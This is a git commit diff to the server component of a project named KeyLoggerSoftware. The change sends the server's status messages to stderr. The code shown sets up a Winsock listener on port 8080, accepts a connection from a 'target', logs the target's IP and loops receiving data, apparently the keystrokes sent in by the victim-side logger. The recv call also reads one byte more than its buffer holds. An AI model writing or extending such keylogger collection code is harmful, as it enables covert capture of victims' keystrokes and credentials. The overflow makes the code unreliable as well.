34aedac3b94b193e019b99a661e2af2b0f611bd6
Qu3b411 <19296119+Qu3b411@users.noreply.github.com>
2018-12-11 13:47:44 -0800

    redirect socket information to stderr
    this allows the xml to be written directly to the file

--- KeyLoggerSoftware/server/main.cpp
+++ KeyLoggerSoftware/server/main.cpp
@@ -9,38 +9,38 @@ int main()
     SOCKADDR_IN server, target;
     int cL;
     char* buffer = (char*)malloc(0x1000);
-    printf("Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
-    printf("\t[*] Initalizing socket...\n");
+    fprintf(stderr ,"Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
+    fprintf(stderr ,"\t[*] Initalizing socket...\n");
     if (WSAStartup(MAKEWORD(2,2), &WSA) !=0)
     {
-        printf("\t\t[*] WSAstartup has failed with Error Code: %d",WSAGetLastError());
+        fprintf(stderr ,"\t\t[*] WSAstartup has failed with Error Code: %d",WSAGetLastError());
         return -1;
     }
-    printf("\t\t[*] WSA startup complete!\n\t[*] creating socket!");
+    fprintf(stderr ,"\t\t[*] WSA startup complete!\n\t[*] creating socket!");
     if((Listener = socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET)
     {
-        printf("Error in creating socket, error code: %d", WSAGetLastError());
+        fprintf(stderr ,"Error in creating socket, error code: %d", WSAGetLastError());
         return -1;
     }
     server.sin_family =AF_INET;
     server.sin_addr.S_un.S_addr = INADDR_ANY;
     server.sin_port=htons(8080);
-    printf("\n\t\t[*] attempting to bind socket to port 8080: ");
+    fprintf(stderr ,"\n\t\t[*] attempting to bind socket to port 8080: ");
     if(bind(Listener,(struct sockaddr*)&server,sizeof(server))== SOCKET_ERROR)
     {
-        printf("failed to bind socket, Error code %d", WSAGetLastError());
+        fprintf(stderr ,"failed to bind socket, Error code %d", WSAGetLastError());
         return -1;
     }
-    printf("accepted\n\t\t[*]Listening: ");
+    fprintf(stderr, "accepted\n\t\t[*]Listening: ");
     listen(Listener,3);
     cL=sizeof(target);
     acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
     if(acceptedTarget==INVALID_SOCKET)
     {
-        printf("\n\t\t[*] error connecting");
+        fprintf(stderr ,"\n\t\t[*] error connecting");
         return -1;
     }
-    printf(" connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
+    fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
     while(1)
     {
         recv(acceptedTarget,buffer,0x1001,0);
